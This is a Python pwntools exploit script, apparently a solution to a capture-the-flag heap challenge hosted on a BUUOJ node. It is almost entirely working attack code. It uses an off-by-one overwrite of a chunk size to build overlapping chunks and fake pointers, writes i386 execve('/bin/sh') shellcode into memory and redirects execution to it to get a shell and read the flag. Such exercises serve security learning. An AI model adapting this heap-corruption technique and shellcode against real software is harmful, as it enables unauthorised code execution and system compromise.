import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn')
			#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28645)
			elf=ELF('./pwn')
			#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,b):
			io.sendline('1')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)
			io.send(b)
			sleep(0.1)

		def delete(a):
			io.sendline('2')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)

		def edit(a,b):
			io.sendline('3')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)
			io.send(b)
			sleep(0.1)

		io.recv()
		add(0x14,'a'*0x14)
		add(0x34,'a'*0x34)
		add(0x34,'a'*0x34)
		add(0x39,'a'*0x39)
		edit(0,'a'*0x14)
		edit(0,'a'*0x14+'\x71')
		#delete(0)
		delete(1)
		delete(2)
		add(0x6c,'a'*0x34+p32(0x39)+p32(0x80EBA08)+'a'*0x30)
		add(0x34,'\n')
		add(0x34,p32(100)+'\n')
		edit(4,'a'*0x30+p32(0x80EBA80)+p32(0x80EA4D8)+'\n')
		shell="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
		edit(0,shell+'\n')
		edit(1,p32(0x80EBA80)+'\n')
		#gdb.attach(io)
		#pause()
		add(32,'a')
		io.sendline('cat flag')
		io.sendline('cat flag')
		io.recv()










		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue